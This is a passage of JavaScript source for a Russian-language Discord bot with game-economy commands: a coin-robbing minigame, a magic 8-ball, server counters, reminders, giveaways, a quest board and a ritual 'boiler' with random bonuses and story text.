      detective    = hurt && random(1 / (-memb.data.thiefWins * 2.87), {round: false}) <= 0.01;


    if (react || monsterHelps || detective) {
      memb.data.coins += rand;
      op.user.coins -= rand;
      let coinsReturn;

      if (react) {
        op.user.thiefGloves = --count + "|" + 0;
        let accusation  = "";
        let action      = "Вы вернули свои коины и хорошо с ним посмеялись";
        let explanation = `${memb.username} успел среагировать и вернул коины`;

        if (hurt){
          let hurtMessage = await memb.msg("❔ Простить Вора?", {description: `Если вы его простите, возможно, он украдёт снова, по статистике 98% воров делают это опять, и опять.\nОсторожно! Вы не сможете узнать кто вас ограбил и не обнулите серию пропущенных атак.\nВ ином случае часть его коинов уйдет к вам.`});
          react = await hurtMessage.awaitReact({user: memb, type: "none", time: 60000}, "😇", "😈");
          if (react === "😇"){
            msg.author.msg(`Вы были пойманы`, {description: `${memb.username} уверен, что это вы его ограбили ${ending(-memb.data.thiefWins, "раз", "", "а", "")} подряд, но также решил просто простить вас за это и не требовать с вас никаких денег.` , color: "ff0000"});
            message.msg("", {footer: {text: "— 💚."}, author: {iconURL: client.user.avatarURL(), name: "Что-же... Это было мило. Наверное..."}});
            return;
          }

          coinsReturn = Math.floor(op.user.coins / 3);
          memb.data.coins += coinsReturn;
          op.user.coins -= coinsReturn;
          accusation = `Сейчас он обвиняется как миниум в ${-memb.data.thiefWins} грабежах и других серьёзных преступлениях, к его горю пострадавший не смог простить такого предательства. В качестве компенсации 30% коинов пользователя (${coinsReturn}) <:coin:637533074879414272> переданы их новому владельцу.`;
          action = `Однако вы не смогли простить предательства, будучи уверенными, что все ${ending(-memb.data.thiefWins, "раз", "", "а", "")} были ограблены именно им.`;
        }

        msg.msg("Пойманный вор", {description: `Сегодня енотовская полиция задержала всеми знакомого жителя ${msg.author.toString()}, он был пойман при попыке стащить коины у ${memb.username}, как утверждает сам задержанный, эти коины ему нужны были, чтобы сделать подарок детишкам.`, color: "ff0000", author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, footer: {text: memb.username, iconURL: memb.avatarURL()}});
        memb.data.thiefWins = Math.max(1, ++membWins);
        message.msg("Ого какая скорость, вы в спортзал ходили?", {description: `Вы быстро догнали воришку, им оказался ваш знакомый ${msg.author.username}\n${action}`});
        return;
      }

      if (monsterHelps){
        msg.author.msg(`Вас настиг огромный монстр. Неудалось похитить коины.`, {color: "ff0000"});
        msg.msg("Почти съеденный вор", {description: `Сегодня огромный монстр 🐲 задержал всеми знакомого жителя ${msg.author.toString()}, он был пойман при попыке стащить коины у ${memb.username}, как утверждает сам задержанный, эти коины ему нужны были, чтобы сделать подарок детишкам.`, color: "ff0000", author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, footer: {text: memb.username, iconURL: memb.avatarURL()}})
        message.msg("Ваш ручной монстр догнал воришку 🐲", {description: `Чуть не съев беднягу, монстр вернул ваши коины, грабителем оказался ваш глупый знакомый ${msg.author.username}...`});

        if (note){
          message.msg("У себя в карманах вы также обнаружили записку:", {description: note});
        }
        return;
      }

      if (detective){
        coinsReturn = -memb.data.thiefWins * 50 * Math.round(combo / 2 + 2);
        op.user.coins -= coinsReturn;
        op.user.thiefGloves = "-2|0";
        memb.data.thiefWins += 5;

        msg.author.msg(`Вас поймал на горячем местный детектив`, {description: `Он давно заинтересовался ${memb} ввиду частых нападений. Теперь вам светит потеря перчаток с компенсацией ущерба.` , color: "ff0000"});
        msg.msg("Вора на горячем поймал герой-детектив", {description: `Известный следователь уже давно наблюдал за ${memb.username}, и не зря! Сегодня на него напал вор — ${msg.author}, он был пойман при попытке украсть коины. Как утверждает сам задержанный, эти коины ему нужны были, чтобы сделать подарок детишкам. Однако за серию в ${-memb.data.thiefWins} нападений, он обязан заплатить компенсацию в размере ${coinsReturn} <:coin:637533074879414272> коинов и сдать любые свои перчатки.\nЭтот детектив убеждён, пока он защищает этот лес — боятся нечего!`, color: "ff0000", author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, footer: {text: memb.username, iconURL: memb.avatarURL()}})
        message.msg("Вас снова попытались ограбить", {description: `Местный детектив давно следил за вами ввиду того, что вас грабили ни один раз. Вам повезло, что сейчас он оказался рядом и смог поймать вора!`});
        return;
      }
    }

    if (combo === 7)
      msg.author.quest("thief");

    if (memb.data.thiefWins >= 9)
      msg.author.quest("crazy");

    if (memb.data.thiefWins < -10)
      memb.quest("hopeless");

    if (op.user.voidThief)
      op.user.chestBonus = nonNaN(op.user.chestBonus) + op.user.voidThief * 10;



    let description = note ? `У себя в карманах вы обнаружили записку:\n— ${note}` : "";
    if (memb.data.voidMonster){
      description = "Ваш монстр не захотел вам помочь, так как недавно вы сами ограбили своего друга\n" + description;
    }
    message.msg("Вы слишком долго не могли прийти в себя — вор ушёл.", {description: description, color: "ff0000"});


    op.user.thiefGloves = count + "|" + combo;
    msg.author.msg(`Всё прошло успешно — вы скрылись и вас не узнали!\nТекущее комбо: ${combo}`);

    message.reactions.cache.get("❗").users.remove();
    memb.data.thiefWins = Math.min(-1, --membWins);

  }, {delete: true, dm: true, memb: true, cooldown: 3, type: "user"}, "ограбить роб украсть"),

  ball: new Command(async (msg, op) => {
    if (!op.args.includes(" ")) {
      return msg.msg("Это не вопрос", {delete: 4000, color: "ff0000"});
    }

    msg.channel.startTyping();
    await delay(700);
    let answer = [{_weight: 1, answer: "*Что-то на призрачном*"}, {_weight: 1, answer: "Ты скучный, я спать"}, {_weight: 2, answer: "\\*Звуки свёрчков\\*"}, {_weight: 3, answer: "нет-нет-нет."}, {_weight: 3, answer: "Я проверил — нет"}, {_weight: 3, answer: "Может быть в другой вселенной"}, {_weight: 4, answer: "Абсолютно и беспрекословно, мой ответ — нет."}, {_weight: 5, answer: "Меч лжи говорит, что да"}, {_weight: 6, answer: "Точно нет"}, {_weight: 7, answer: "неа"}, {_weight: 8, answer: "нет"}].random({weights: true}).answer;
    client.api.channels(msg.channel.id).messages.post({data: {"content": `${answer}`, "message_reference": {message_id: msg.id}}});
    await delay(1500);
    msg.channel.stopTyping();
  }, {cooldown: 3, try: 2, args: true, type: "other"}, "8ball шар"),

  avatar: new Command(async (msg, op) => {
    msg.msg((op.memb || msg.author).avatarURL({dynamic : true}), {embed: true});
  }, {cooldown: 12, try: 2, delete: true, type: "other"}, "аватар"),

  counter: new Command(async (msg, op) => {
    if (CounterManager.counterData.filter(e => e.guild == msg.guild).length > 14) msg.msg("Максимум 15 счётчиков", {color: "ff0000", delete: 7000});

    let isChannelQuestion = await msg.msg("🪄 Выберите тип объекта для счётчика", {description: "Счётчики работают с каналами и сообщениями\nвыберите тип\n❯ 🖊️Сообщение\n❯ 🪧 Канал\n❯ 🖌️ Отправка сообщения"});
    let type = await isChannelQuestion.awaitReact({user: msg.author, type: "all"}, "🖊️", "🪧", "🖌️");
    if (!type) return isChannelQuestion.delete();
    isChannelQuestion.msg("🪄 Отлично! Введите текст с использованием шаблонов", {description: "Каждые 15 минут счётчик будет обрабатыватся изменяя своё значение за счёт шаблонов внутри него", edit: true});
    let template = await msg.channel.awaitMessage(msg.author);
    if (!template) return isChannelQuestion.delete();
    template = template.content;
    isChannelQuestion.delete();

    if (!template.match(/!\{.+?\}/)) return msg.msg("В сообщении отсуствуют шаблоны.", {color: "ff0000", delete: 5000});
    let counter;
    switch (type) {
      case "🖊️":
        let embed = {embed: true};
        let textValue = template;
        let message = await msg.msg("Вашему сообщению нужен эмбед?", {description: `Подразумивается эмбед-обёртка, цвет и заглавие`});
        react = await message.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
        message.delete();
        if (react == 685057435161198594){
          embed = {description: template}
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите оглавление эмбеда", embed: {description: `Оглавление — голова эмбед сообщения...\nОна поддерживает шаблоны`, time: 1200000}});
          if (!answer) return false;
          textValue = answer.content || "";

          answer = await msg.channel.awaitMessage(msg.author, {message: "Введите цвет в HEX формате", embed: {description: `HEX — #ff0000, где первые два числа в 16-значной системе (0,1,2,...,e,f) — красный, потом зеленый и синий`, time: 1200000}});
          if (!answer) return false;
          embed.color = answer.content.replace("#", "");
        }

        msg.msg("Через секунду здесь появится сообщение", {description: "Это и будет готовый счётчик", delete: 7000});
        await delay(1500);
        counter = await msg.msg(textValue, embed);
        new CounterManager(msg.channel.id, msg.guild.id, "message", template, counter.id);
      break;
      case "🪧":
        let channel = await msg.channel.awaitMessage(msg.author, {message: "Введите айди канала или упомяните его"});
        if (channel){
          channel = (channel.mentions.channels.first()) ? channel.mentions.channels.first() : msg.guild.channels.cache.get(channel.content);
          msg.msg("Готово, название этого канала отображает введенную инфомацию.", {description: "Чтобы удалить счётчик, воспользуйтесь командой `!counters`", delete: 7000});
          new CounterManager(channel.id, msg.guild.id, "channel", template);
        }
        else msg.channel.msg("Канал не существует", {color: "ff0000"});
      break;
      case "🖌️":
        let interval = await msg.channel.awaitMessage(msg.author, {message: "Укажите кол-во минут между отправкой сообщения", description: "Минимум 15м"});
        interval = interval && +interval.content > 15 && +interval.content;
        if (!interval) return msg.msg("Неверное значение", {color: "ff0000", delete: 4000});
        new CounterManager(msg.channel.id, msg.guild.id, "poster", template, interval);
      break;
      default: return await delay(2000);

    }
  }, {delete: true, Permissions: 16, dm: true, type: "guild"}, "счётчик счетчик count"),

  counters: new Command(async (msg, op) => {
    const fromType = (e) => ({message: `🖊️ [Сообщение.](https://discord.com/channels/${e.guild}/${e.channel}/${e.args})`, channel: `🪧 \`#${msg.guild.channels.cache.get(e.channel).name}\``, poster: `🖌️ <#${e.channel}>`}[e.type]);
    let counters = CounterManager.counterData.filter(e => e.guild == msg.guild.id).map((e, i) => ({name: `**${i + 1}.**`, value: fromType(e), inline: true, _original: e}));
    let message  = await msg.msg("Счётчики сервера", {fields: counters[0] ? counters : {name: "Но тут — пусто.", value: "Чтобы добавить счётчики, используйте `!counter`"}});

    const reactions = () => (counters[0] && !op.member.wastedPermissions(16)[0]) ? ["✏️", "🗑️"] : ["❌"];
    let react, question, answer, counter;
    while (true){
      react = await message.awaitReact({user: msg.author, type: "all"}, ...reactions());
      switch (react) {
        case "🗑️":
          question = await msg.msg("Введите номер счётчика, для его удаления");
          answer = await reactOrMessage(question, msg.author, "❌");
          question.delete();
          if (!answer || !answer.content || isNaN(answer.content) || answer.content > counters.length) break;
          counter = counters.splice(answer.content - 1, 1)[0];
          CounterManager.delete(counter._original);
          counters.forEach((e, i) => e.name = `**${i + 1}.**`);
          message.msg("Счётчики сервера", {edit: true, fields: counters[0] ? counters : {name: "Тут пусто.", value: "Вы удалили последний счётчик"}, description: `Счётчик #${answer.content} успешно удалён.`});
        break;
        case "✏️":
          question = await msg.msg("Введите номер счётчика, для его редактирования");
          answer = await reactOrMessage(question, msg.author, "❌");

          if (!answer || !answer.content || isNaN(answer.content) || answer.content - 1 > counters.length){
            question.delete();
            msg.msg("Элемента с таким номером не существует", {color: "ff0000"});
            break;
          };

          counter = counters[answer.content - 1];
          question.msg("Введите новое содержание", {edit: true, description: `**Старое:**\n\`\`\`${Discord.Util.escapeCodeBlock( counter._original.template )}\`\`\``, destroy: true});
          answer = await msg.channel.awaitMessage(msg.author);
          question.delete();
          counter._original.template = answer.content;
          CounterManager.writeFile();
          CounterManager.up(counter._original);

          counter.value = counter.type == "channel" ? `🪧 \`#${msg.guild.channels.cache.get(e.channel).name}\`` : counter.value ;
          message.msg("Счётчики сервера", {edit: true, fields: counters, description: `Сообщение счётчика успешно отредактированно!`});
        break;
        default: return message.delete();
      }
    }
  }, {cooldown: 10, try: 3, delete: true, dm: true, type: "guild"}, "счётчики счетчики"),

  remind: new Command(async (msg, op) => {
    let args = op.args.split(" ");
    let i = 0;
    while (args[i] && args[i].match(/\d+(?:д|d|ч|h|м|m|с|s)/)){
      i++;
    }
    let times = args.splice(0, i);
    const phrase = args.join(" ");

    if (i === 0){

      const userReminds = TimeEvent.eventData.filter(({func, args: [authorId]}) => {

        if (func !== "remind")
          return;


        if (authorId !== msg.author.id)
          return;

        return true;
      });

      userReminds.description = userReminds
        .map(({args: [authorId, channelId, phrase], ms}) => {
          ms = Math.floor(ms / 1000);
          return `• <t:${ ms }:R> — ${ phrase }.`;
        })
        .join("\n\n");

      const description = `Пример:\n!напомни 1ч 7м ${ phrase }${ userReminds.length ? `\n\nВаши напоминания:\n${ userReminds.description.slice(0, 1000) }` : "" }`;
      msg.msg("Вы не указали время, через какое нужно напомнить..", { color: "ff0000", delete: 50000, description });
      return;
    }

    let timeTo = 0;
    times.forEach(e => {
      switch (e.slice(-1)) {
        case "d":
        case "д":
          timeTo += 86400000 * e.slice(0, -1);
          break;
        case "h":
        case "ч":
          timeTo += 3600000 * e.slice(0, -1);
          break;
        case "m":
        case "м":
          timeTo += 60000 * e.slice(0, -1);
          break;
        case "s":
        case "с":
          timeTo += 1000 * e.slice(0, -1);
          break;
      }
    });
    new TimeEvent("remind", timeTo, msg.author.id, msg.channel.id, phrase);
    msg.msg("Напомнинание создано", {description: `— ${ phrase[0].toUpperCase() + phrase.slice(1) }`, timestamp: getTime() + timeTo, footer: {iconURL: msg.author.avatarURL(), text: msg.author.username}});
  }, {cooldown: 20, try: 3, delete: true, type: "other"}, "напомни напоминание напомнить"),

  giveaway: new Command(async (msg, op) => {
    let message = await msg.msg("🌲 Создание раздачи", {description: "Используйте реакции ниже, чтобы настроить раздачу!\n◖🪧  Текст 🚩\n◖⏰  Дата окончания 🚩\n◖🎉  Кол-во победителей\n◖🎁  Выдаваемые роли", color: "4a7e31", footer: {text: "🚩 Обязательные пункты перед началом"}});
    let react, answer, timestamp, title, descr, winners = 1, role;
    do {
      react = await message.awaitReact({user: msg.author, type: "one"}, "🪧", "⏰", "🎉", "🎁", (timestamp && descr) ? "640449832799961088" : null);
      switch (react) {
        case "🪧":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Укажите заглавие`});
          if (!answer) return;
          title = answer.content;

          answer = await msg.channel.awaitMessage(msg.author, {message: `Укажите ${descr ? "новое " : ""}описание этой раздачи`, embed: {description: descr ? "Старое: " + descr : ""}, time: 1800000});
          if (!answer) return;
          descr = answer.content;
          break;
        case "⏰":
          let parse = new Date();
          answer = await msg.channel.awaitMessage(msg.author, {message: `Установите дату и время конца ивента`, embed: {description: `Вы можете указать что-то одно, числа разделенные точкой будут считаться датой, двоеточием — время\n**Вот несколько примеров:**\n22:00 — только время\n31.12 — только дата\n11:11 01.01 — дата и время\nОбратите внимание! Время сервера (${new Intl.DateTimeFormat("ru-ru", {weekday: "short", hour: "2-digit", minute: "2-digit"}).format(parse)}) может отличается от вашего`}});
          if (!answer) {
            return;
          }

          let co = answer.content;
          let finded = [co.match(/(?<=\.)\d\d/), co.match(/\d\d(?=\.)/), co.match(/\d\d(?=:)/), co.match(/(?<=:)\d\d/)].map(e => e ? e[0] : undefined);
          if (!finded.some(e => e)) {
            msg.msg("Нам неудалось найти ни одной метки времени, попробуйте ещё раз", {color: "ff0000", delete: 4000})
            break;
          }
          let [month = parse.getMonth() + 1, days = parse.getDate(), hours = parse.getHours(), minutes = 0] = finded;
          timestamp = new Date(parse.getFullYear(), month - 1, days, hours, minutes, 0);
          if (timestamp.getTime() - getTime() < 0) {
            let messageSetYear = await msg.msg("Эта дата уже прошла, хотите установить на следующий год?");
            react = await messageSetYear.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
            messageSetYear.delete();
            if (react == "685057435161198594") timestamp += 31536000000;
            else {
              msg.msg("Операция отменена", {delete: 4000});
              break;
            }
          }
          timestamp = timestamp.getTime();
          msg.msg(`Готово! Времени до окончания ~${timestampToDate(timestamp - getTime(), 3)}`, {delete: 3000, timestamp});
          break;
        case "🎉":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Введите количество возможных победителей`});
          if (!answer) {
            return;
          }
          if (isNaN(answer.content)) {
            msg.msg("Указано не число", {color: "ff0000", delete: 3000});
            break;
          }
          winners = Number(answer.content);
          break;
        case "🎁":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Упомяните роль или введите её айди`});
          if (!answer) return;
          role = answer.content.match(/(?:<@&)?(\d+)>?/)[1];
          break;
        case "640449832799961088":
          let giveaway = await msg.msg(title, {description: descr, timestamp, reactions: ["🌲"], color: "4a7e31", footer: {text: "Окончание раздачи: "}});
          new TimeEvent("giveaway", timestamp - getTime(), msg.channel.id, giveaway.id, winners, role);
        default:
          await delay(1000);
          message.delete();
          return;
      }
      let description = message.embeds[0].description.replace(react, "<a:yes:763371572073201714>");
      if (description != message.embeds[0].description) message.msg("🌲 Создание раздачи", {edit: true, color: "4a7e31", description: description});
    } while(react);
  }, {delete: true, Permissions: 32, type: "guild"}, "раздача розыгрыш"),

  template: new Command(async (msg, op) => {
    let value = await new Template(op.args, msg, {});
    msg.msg(`**${value}**`, {color: "ff0000", embed: true});
  }, {args: true, type: "dev"}, "шаблон"),

  quests: new Command(async (msg, op) => {
    let memb = ((op.memb) ? op.memb : (op.args) ? client.users.cache.get(op.args) : msg.author);
    let user = memb.data;

    user.completedQuest = user.completedQuest || [];
    let globalQuests = Object.entries(quests.names).map(([key, name]) => user.completedQuest.includes(key) ? "<a:yes:763371572073201714> " + "**" + name.split("&")[0] + "**": "<a:Yno:763371626908876830> " + name.split("&")[0]);
    let secretAchievements = [user.voidIce, user.crown];

    let nextDaily = `До обновления: \`${+((new Date().setHours(23, 59, 50) - getTime()) / 3600000).toFixed(1)}ч\``;
    let fields = [
      {
        name: "Прогресс достижений:",
        value: `Достигнуто: \`${user.completedQuest.length}/${Object.values(quests.names).length + user.completedQuest.filter(e => !(e in quests.names)).length}\`\nСекретных: \`${secretAchievements.filter(e => e).length}/2\``
      },
      {
        name: "Дневные задачи:",
        value: `Выполнено: \`${user.dayQuests || 0}\`\nДо следующей метки: \`${Math.ceil((user.dayQuests + 1) / 50) * 50 - user.dayQuests || 50}\``
      },
      {
        name: "Сведения последнего квеста:",
        value: `Множитель награды: \`X${user.questReward.toFixed(1)}\`\nПрогресс: \`${user.questProgress == user.questNeed ? "Выполнено" : user.questProgress + "/" + user.questNeed}\`\nНазвание: \`${user.quest || "Да фиг знает"}\`\n${nextDaily}`
      }
    ]
    msg.msg("Доска квестов", {author: {name:  user.name, iconURL: memb.avatarURL()}, description: globalQuests.join("\n"), fields, image: "https://media.discordapp.net/attachments/549096893653975049/830749264928964608/5.png?width=300&height=88", thumbnail: "https://cdn.discordapp.com/emojis/830740711493861416.png?v=1"})
  }, {delete: true, cooldown: 35, try: 3, type: "user"}, "quest квесты"),

  witch: new Command(async (msg, op) => {
    // <a:void:768047066890895360> <a:placeForVoid:780051490357641226> <a:cotik:768047054772502538>

    if (op.memb){
      const data = op.memb.data;
      msg.msg("<a:cotik:768047054772502538> Друг странного светящегося кота — мой друг", {description: `Сегодня Вы просматриваете профиль другого человека. Законно ли это? Конечно законно, он не против.\n${ op.memb.username }, использовал котёл ${ data.voidRituals } раз.\nЕго бонус к опыту: ${ (100 * (1.02 ** data.voidRituals)).toFixed(2) }% от котла.\n<a:placeForVoid:780051490357641226>\n\nСъешь ещё этих французких булок, да выпей чаю`, color: "3d17a0"});
      return;
    }

    let user = op.user;
    let minusVoids = Math.floor(Math.min(2 + user.voidRituals, 20) * (1 - 0.10 * nonNaN(user.voidPrise)));

    const sendVoidOut = () => {
      const description = `Добудьте ещё ${ending(minusVoids - user.void, "уров", "ней", "ень", "ня")} нестабильности <a:placeForVoid:780051490357641226>\nЧтобы провести ритуал нужно ${ ending(minusVoids, "камн", "ей", "ь", "я") }, а у вас лишь ${ user.void };\nИх можно получить, с низким шансом, открывая ежедневный сундук.\nПроведено ритуалов: ${user.voidRituals}\nКотёл даёт полезные бонусы, а также увеличивает количество опыта.`;
      const footer = {text: ["Интересно, куда делись все ведьмы?", "Правило по использованию номер 5:\nНИКОГДА не используйте это.*", "Неприятности — лучшие друзья странных светящихся котов.", "Берегитесь мяукающих созданий."].random()};
      msg.msg("<a:void:768047066890895360> Не хватает ресурса", {description, color: "3d17a0", footer});
    }

    if (user.void < minusVoids) {
      sendVoidOut();
      return;
    }

    let boiler = await msg.msg("<a:placeForVoid:780051490357641226> Готовы ли вы отдать свои уровни за вечные усиления..?", {description: `Потратьте ${ minusVoids } ур. нестабильности, чтобы стать быстрее, сильнее и хитрее.\n~ Повышает заработок опыта на 2%\nПроведено ритуалов: ${ user.voidRituals }\nБонус к опыту: ${ (100 * (1.02 ** user.voidRituals)).toFixed(2) }%\n\nКроме того, вы сможете выбрать одно из трёх сокровищ, дарующих вам неймоверную мощь!\n<a:cotik:768047054772502538>`, color: "3d17a0"});
    let isHePay = await boiler.awaitReact({user: msg.author, type: "all"}, "768047066890895360");

    if (!isHePay) {
      boiler.msg("Возвращайтесь, когда будете готовы.", {description: "Проведение ритуала было отменено", edit: true, color: "3d17a0"});
      return;
    }

    if (user.void < minusVoids) {
      sendVoidOut();
      boiler.delete();
      return;
    }

    // user.CD_48 = getTime() + 259200000;
    await delay(1000);

    // Вы не потеряете нестабильность
    if (  user.voidDouble && random(11) === 1 ){
      minusVoids = 0;
    }

    user.void -= minusVoids;
    user.voidRituals++;

    let double_effects = [
      {
        emoji: "🌀",
        description: "Уменьшает кулдаун получения опыта за сообщение на 0.2с",
        _weight: 100 - nonNaN(user.voidCooldown * 5),
        filter_func: () => !(user.voidCooldown >= 20),
        action: () => user.voidCooldown = ++user.voidCooldown || 1
      },
      {
        emoji: "🔅",
        description: `Мгновенно получите бонус сундука в размере \`${ Math.min(user.voidRituals * 18 + nonNaN(user.chestBonus * 2) + 38, 9000) }\``,
        _weight: 50,
        action: () => user.chestBonus = nonNaN(user.chestBonus) + Math.min(nonNaN(user.chestBonus * 2) + user.voidRituals * 18 + 38, 9000)
      },
      {
        emoji: "⚜️",
        description: "Уменьшает цену нестабильности для розжыга котла. (Макс. на 50%)",
        _weight: 5,
        filter_func: () => !(user.voidPrise >= 5),
        action: () => user.voidPrise = ++user.voidPrise || 1
      },
      {
        emoji: "🃏",
        description: "Даёт 9%-ный шанс не потерять уровни нестабильности во время ритуала.",
        _weight: 3,
        filter_func: () => !user.voidDouble,
        action: () => user.voidDouble = 1
      },
      {
        emoji: "🔱",
        description: "Делает ежедневные квесты на 15% сложнее, однако также увеличивает их награду на 30%",
        _weight: 10,
        filter_func: () => !(user.voidQuests >= 5),
        action: () => user.voidQuests = ++user.voidQuests || 1
      },
      {
        emoji: "✨",
        description: `Увеличивает награду коин-сообщений на ${7 + user.voidRituals} ед.`,
        _weight: 35,
        action: () => user.coinsPerMessage = nonNaN(user.coinsPerMessage) + 7 + user.voidRituals
      },
      {
        emoji: "💠",
        description: "Даёт \\*бонуы сундука* каждый раз, когда с помощью перчаток вам удается кого-то ограбить.",
        _weight: 20,
        action: () => user.voidThief = ++user.voidThief || 1
      },
      {
        emoji: "😈",
        description: `Создайте экономических хаос, изменив стоимость клубники на рынке! ${ 7 + Math.floor(5 * Math.sqrt(user.voidRituals)) } коинов в случайную сторону.`,
        _weight: 10,
        action: () => data.bot.berrysPrise += 7 + Math.floor(5 * Math.sqrt(user.voidRituals)) * (-1) ** random(1)
      },
      {
        emoji: "🍵",
        description: `Удваивает для вас всякий бонус клевера\nНесколько бонусов складываются`,
        _weight: 5,
        action: () => user.voidMysticClover = ++user.voidMysticClover || 1
      },
      {
        emoji: "📿",
        description: `Получите ${ Math.floor(user.keys / 100) } ур. нестабильности взамен ${user.keys - (user.keys % 100)} ключей.`,
        _weight: 30,
        filter_func: () => user.keys >= 100 && user.chestLevel,
        action: () => {
          user.void += Math.floor(user.keys / 100);
          user.keys = user.keys % 100;
        }
      },
      {
        emoji: "♦️",
        description: `Увеличивает вероятность коин-сообщения на 10%!`,
        _weight: 15,
        filter_func: () => !(user.voidCoins >= 7),
        action: () => user.voidCoins = ~~user.voidCoins + 1
      },
      {
        emoji: "🏵️",
        description: `Улучшает сундук до ${user.chestLevel + 2} уровня. Требует ${user.chestLevel ? 500 : 150} ключей.`,
        _weight: Infinity,
        filter_func: () => user.chestLevel != 2 && user.keys >= (user.chestLevel ? 500 : 150),
        action: () => user.keys -= user.chestLevel++ ? 500 : 150
      },
      {
        emoji: "💖",
        description: `Ваши монстры будут защищать вас от ограблений Воров`,
        _weight: 3,
        filter_func: () => user.monster && !user.voidMonster,
        action: () => user.voidMonster = 1
      },
      {
        emoji: "📕",
        description: `Вы можете брать на одну клубнику больше с дерева. Также при сборе повышает её цену на рынке`,
        _weight: 20,
        filter_func: () => "seed" in user,
        action: () => user.voidTreeFarm = ~~user.voidTreeFarm + 1
      },
      {
        emoji: "🥂",
        description: "Лотерейный билетик из Лавки заменяется настоящим казино",
        _weight: 3,
        filter_func: () => !user.voidCasino,
        action: () => user.voidCasino = 1
      },
      {
        emoji: "🧵",
        description: `Получите случайное количество нестабильности: 1–${ minusVoids * 2 }; Снижает уровень котла на 2.\nЕсли Ваш уровень кратен четырем, Вы получите одну дополнительную нестабильность.`,
        _weight: 2,
        filter_func: () => user.voidRituals > 4,
        action: () => {
          const voids = random(1, minusVoids * 2) + !(user.level % 4);
          user.void += voids;
          user.voidRituals -= 3;
        }
      },
      {
        emoji: "🪸",
        description: `Позволяет иметь более более одного проклятия`,
        _weight: Infinity,
        filter_func: () => !(user.cursesEnded % 10) && !user.voidFreedomCurse,
        action: () => user.voidFreedomCurse = 1
      },
      {
      emoji: "❄️",
        // Хладнокровное одиночество
        description: `Вы получаете на 50% больше опыта и возможность грабить без рисков до момента, пока вас не похвалят, НО вас больше никто не сможет похвалить.`,
        _weight: 1,
        filter_func: () => !user.voidIce && !user.praiseMe || !user.praiseMe.length,
        action: () => {
          user.voidIce = true;
          msg.author.msg("Охлаждение чувств", {description: `Вы выполнили секретное достижение\nОписание: \"Променяйте всех знакомых на кучку монет и метод самоутверждения\"\nВозможно вы просто действуете рационально, но все-таки обратного пути больше нет.\nЭто достижение выполнило 0.000% пользователей.`});
        }
      }
    ].filter(e => !e.filter_func || e.filter_func());

    let bonuses = [...new Array(3)].map(() => double_effects.random({pop: true, weights: true}));
    await boiler.msg("<a:placeForVoid:780051490357641226> Выберите второстепенный бонус", {description: `Вы можете выбрать всего одно сокровище, хорошенько подумайте, прежде чем что-то взять.\n${bonuses.map(e => e.emoji + " " + e.description).join("\n\n")}`, edit: true, color: "3d17a0"});

    let react = await boiler.awaitReact({user: msg.author, type: "all"}, ...bonuses.map(e => e.emoji));
    if (!react) react = bonuses.random().emoji;

    bonuses.find(e => e.emoji == react).action();

    boiler.msg("Ритуал завершен..." , {description: `Вы выбрали ${react}\nОстальные бонусы более недоступны.\n\n${bonuses.map(e => e.emoji + " " + e.description).join("\n\n")}`, color: "3d17a0", edit: true});
    await delay(3000);
    let answer = "";
    const add = (content) => answer = `${content}\n${answer}`;
    switch (user.voidRituals) {
      case 23:
        add("Мы не знаем что произошло дальше. . .");
      break;
      case 22:
        add("...");
      break;
      case 19:
        msg.author.quest("completeTheGame");
        add("Но должен ли я остановится? Вселенных, как известно, бесчисленное множество, бесконечность... Поглощая самого себя снова, и снова, мне, возможно, удастся получить ответ. А с приобретенной силой я создам идеальный мир..!")
        add("— Получается я убил их, уничтожил целые вселенные, миры.. Каждый раз я попадая в новую вселенную, заменял собою себя, уничтожая минувший мир. Неужели этого нельзя исправить.. Неужели это конец?");
      case 18:
      case 17:
        add("");
        add("— С каждым днем я ощущаю большую силу, начинаю задумываться о вещах, о которых раньше и слышать не смел. Меня посещают странные мысли, но больше всего меня беспокоит отсутствие беспокойства.");
      case 16:
        add("");
        add("— Прошло не мало времени с последнего ритуала, я всё так же пытаюсь понять что случилось, некоторые мои знакомые стали считать меня сумаcшедшим. Странно, что никто и никогда не видел никаких вспышек в небе, как их можно не заметить? Никак.");
      case 15:
        add("");
        add("Может я сошёл с ума, или я умер, а то что я чувствую это остатки моей самости, её последние воспоминания, которые я вновь и вновь бесконечно чувствую?.. Я не знаю");
        add("Нет, это не мог быть сон! Снова вспоминая каждый огонёк, каждую \"трещину\", рождающуюся в небе, и всё то, странное, что тогда было...");
      case 14:
      case 13:
      case 12:
      case 11:
      case 10:
        add("Размышление о происходящем весь день не покидали вас, чувство беспокойства не позволяло думать о другом.. Мыслями вы снова, и снова возвращаетесь туда, где всё только начиналось.");
      case 9:
      case 8:
      case 7:
      case 6:
      case 5:
        add("Даже ваша собака может подтвердить, что вчера весь день вы были в своей кровати и играли в видео-игры. Как и ваш друг, который тогда выносил вас в танчиках, скажет то же, что и пёс.");
      case 4:
        add("Нет, это не мог быть сон, вспоминая каждый летающий в черном небе огонёк, думаете вы. Но факты говорят обратное..");
      case 3:
      case 2:
        add("");
        add("Всё было такое яркое и красочное..");
      case 1:
        add("Впереди стояла необъяснимо-необъяснимая дверь, за которой виднелась ваша комната. Войдя, вы просыпаетесь на своей кровати, вокруг всё как раньше. Ощущаете себя, как никогда хорошо, но с помутнённым разумом.");
        add("\*Яркая вспышка котла что-то изменила в этом мире, он начал разрушаться.\*");
        break;
      default:
        add("...");

    }
    msg.msg(`День ${Math.round(user.voidRituals ** 2.093 / 1.3)}.`, {description: answer, image: user.voidRituals === 19 ? "https://media.discordapp.net/attachments/629546680840093696/843562906053640202/2.jpg?width=1214&height=683" : "https://media.discordapp.net/attachments/629546680840093696/836122708185317406/mid_250722_922018.jpg", footer: {iconURL: msg.author.avatarURL(), text: msg.author.username}, color: "000001"});


  }, {delete: true, type: "user"}, "boiler котёл котел ведьма"),

  charity: new Command(async (msg, op) => {
    let heAccpet = await accept("charity", {message: "Благотворительность это хорошо, но используя эту команду вы потеряете коины!", description: "Ваши богатсва будут разданы людям с этого сервера."}, msg.channel, op.user);
    if (!heAccpet) return;

    let cash = op.args.match(/\d+|\+/);

    if (!cash) {
